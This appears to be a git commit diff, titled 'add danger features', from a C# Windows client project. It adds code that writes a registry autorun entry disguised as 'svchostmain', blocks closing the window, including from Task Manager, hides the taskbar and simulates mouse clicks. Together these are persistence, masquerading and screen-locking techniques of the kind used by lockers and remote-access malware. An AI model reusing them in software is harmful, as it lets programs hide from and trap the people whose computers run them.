045bc50f0e15016e847682524bc876159e80e7ab
thespiker <Fili_vw23@student.itstep.org>
2022-11-21 00:38:50 +0200

    add danger features

---
+++ CyberEra-Client/Control/WindowsControl.cs
@@ -0,0 +1,60 @@
+﻿using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System;
+using System.Windows.Forms;
+
+namespace CyberEra_Client.Control {
+    internal class WindowsControl {
+
+        public bool SetAutorunValue(bool autorun) {
+            string name = "svchostmain";
+            string ExePath = Application.ExecutablePath;
+
+            RegistryKey reg;
+            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try {
+                if (autorun) {
+                    reg.SetValue(name, ExePath);
+
+                } else {
+                    reg.DeleteValue(name);
+                }
+                reg.Close();
+            } catch {
+                return false;
+            }
+            return true;
+        }
+
+
+      
+
+        //
+        //  Запретить закрытие
+        //
+        public void Client_FormClosing_deny(object sender, FormClosingEventArgs e) {
+            if (e.CloseReason == CloseReason.UserClosing |
+                e.CloseReason == CloseReason.MdiFormClosing |
+                e.CloseReason == CloseReason.TaskManagerClosing |
+
+                e.CloseReason == CloseReason.FormOwnerClosing) {
+                e.Cancel = true;
+            }
+        }
+
+
+        //
+        //  Разрешить закрытие
+        //
+        public void Client_FormClosing_access(object sender, FormClosingEventArgs e) {
+            if (e.CloseReason == CloseReason.UserClosing |
+                e.CloseReason == CloseReason.MdiFormClosing |
+                e.CloseReason == CloseReason.TaskManagerClosing |
+
+
+                e.CloseReason == CloseReason.FormOwnerClosing) {
+                e.Cancel = false;
+            }
+        }
+    }
+}
--- CyberEra-Client/View/ClientForm.cs
+++ CyberEra-Client/View/ClientForm.cs
@@ -12,97 +12,133 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.IO;
 using System.Runtime.InteropServices.ComTypes;
+using CyberEra_Client.Control;
+using System.Runtime.InteropServices;
 
 namespace CyberEra_Client {
     public partial class ClientForm : Form {
-        
+
         private static TcpClient client = new TcpClient();
         private static NetworkStream stream = null;
-        
+        private static WindowsControl WindowsController = new WindowsControl();
+
+
         public ClientForm() {
             InitializeComponent();
+            this.WindowState = FormWindowState.Maximized;
+            this.Bounds = Screen.PrimaryScreen.WorkingArea;
+            // FormClosing += WindowsController.Client_FormClosing_deny;
+            WindowsController.SetAutorunValue(false);
+            const int x = 32000;
+            const int y = 32000;
+            //Put mouse in the screen ceneter and click its right button to prevent ability
+            //of taskbar
+            
 
 
-            const int PORT = 8888;
-            const string HOST = "127.0.0.1";
+int hwnd = FindWindow("Shell_TrayWnd", "");
+            ShowWindow(hwnd, SW_HIDE);
 
+            mouse_event(MouseFlags.Absolute | MouseFlags.Move, x, y, 0, UIntPtr.Zero);
+                    mouse_event(MouseFlags.Absolute | MouseFlags.RightDown, x, y, 0, UIntPtr.Zero);
+                    mouse_event(MouseFlags.Absolute | MouseFlags.RightUp, x, y, 0, UIntPtr.Zero);
+              
+            //const int PORT = 8888;
+            //const string HOST = "127.0.0.1";
+            /*
+                        try {
+                            client.Connect(HOST, PORT);
+                            stream = client.GetStream();
 
-//            Console.Write("Enter name:\t");
-            //string userName = Console.ReadLine();
+                            //
+                            //  send name
+                            //
+                            byte[] buffer = Encoding.Unicode.GetBytes("");
+                            stream.Write(buffer, 0, buffer.Length);
 
-            //Console.Title = userName;
+                            //
+                            //  send adress
+                            //
+                            byte[] adr = Encoding.Unicode.GetBytes(GetLocalIPAddress());
+                            stream.Write(adr, 0, adr.Length);
 
-            try {
-                client.Connect(HOST, PORT);
-                stream = client.GetStream();
+                        //    SendMsg();
 
-                //
-                //  send name
-                //
-                byte[] buffer = Encoding.Unicode.GetBytes("");
-                stream.Write(buffer, 0, buffer.Length);
-
-                //
-                //  send adress
-                //
-                byte[] adr = Encoding.Unicode.GetBytes(GetLocalIPAddress());
-                stream.Write(adr, 0, adr.Length);
-
-              //  Thread receiveMsgThread = new Thread(ReceiveMsg);
-              //  receiveMsgThread.Start();
-              //  Console.WriteLine($"Welcome, {userName}");
-                SendMsg();
-
-            } catch (Exception ex) {
-                //   Console.WriteLine(ex.Message);
-                File.WriteAllText("logs","");
-                File.AppendAllText("logs", ex.Message);
-            } finally {
-                Disconnect();
-            }
-           // Console.ReadKey();
+                        } catch (Exception ex) {
+                            //   Console.WriteLine(ex.Message);
+                            File.WriteAllText("logs","");
+                            File.AppendAllText("logs", ex.Message);
+                        } finally {
+                            Disconnect();
+                        }*/
+            // Console.ReadKey();
         }
 
 
-        private static void SendMsg() {
-            Console.Write("Enter msg:\t");
-            while (true) {
-                //
-                //  send message
-                //
-                byte[] data = Encoding.Unicode.GetBytes(Console.ReadLine());
-                stream.Write(data, 0, data.Length);
 
-                //
-                //  send time
-                //
-                byte[] data2 = Encoding.Unicode.GetBytes(DateTime.Now.ToString());
-                stream.Write(data2, 0, data2.Length);
+        [DllImport("user32.dll")]
+        private static extern int FindWindow(string className, string windowText);
+        [DllImport("user32.dll")]
+        private static extern int ShowWindow(int hwnd, int command);
+
+        private const int SW_HIDE = 0;
+        private const int SW_SHOW = 1;
 
 
-            }
-        }
 
-        private static void ReceiveMsg() {
-            while (true) {
-                try {
-                    byte[] data = new byte[256];
-                    StringBuilder builder = new StringBuilder();
-                    int byteCount = 0;
-                    do {
-                        byteCount = stream.Read(data, 0, data.Length);
-                        builder.Append(Encoding.Unicode.GetString(data, 0, byteCount));
-                    } while (stream.DataAvailable);
+        [DllImport("User32.dll")]
+        static extern void mouse_event(MouseFlags dwFlags, int dx, int dy, int dwData, UIntPtr dwExtraInfo);
 
-                    Console.WriteLine(builder.ToString());
-                } catch (Exception ex) {
-                    Console.WriteLine(ex.Message);
-                    Disconnect();
-                    Environment.Exit(0);
-                }
-            }
-        }
+        //Mouse flags enum
+        [Flags]
+        enum MouseFlags {
+            Move = 0x0001,
+            LeftDown = 0x0002,
+            LeftUp = 0x0004,
+            RightDown = 0x0008,
+            RightUp = 0x0010,
+            Absolute = 0x8000
+        };
 
+        /*   private static void SendMsg() {
+               Console.Write("Enter msg:\t");
+               while (true) {
+                   //
+                   //  send message
+                   //
+                   byte[] data = Encoding.Unicode.GetBytes(Console.ReadLine());
+                   stream.Write(data, 0, data.Length);
+
+                   //
+                   //  send time
+                   //
+                   byte[] data2 = Encoding.Unicode.GetBytes(DateTime.Now.ToString());
+                   stream.Write(data2, 0, data2.Length);
+
+
+               }
+           }*/
+
+        /* private static void ReceiveMsg() {
+             while (true) {
+                 try {
+                     byte[] data = new byte[256];
+                     StringBuilder builder = new StringBuilder();
+                     int byteCount = 0;
+                     do {
+                         byteCount = stream.Read(data, 0, data.Length);
+                         builder.Append(Encoding.Unicode.GetString(data, 0, byteCount));
+                     } while (stream.DataAvailable);
+
+                     Console.WriteLine(builder.ToString());
+                 } catch (Exception ex) {
+                     Console.WriteLine(ex.Message);
+                     Disconnect();
+                     Environment.Exit(0);
+                 }
+             }
+         }
+ */
         private static void Disconnect() {
             stream.Close();
             client.Close();
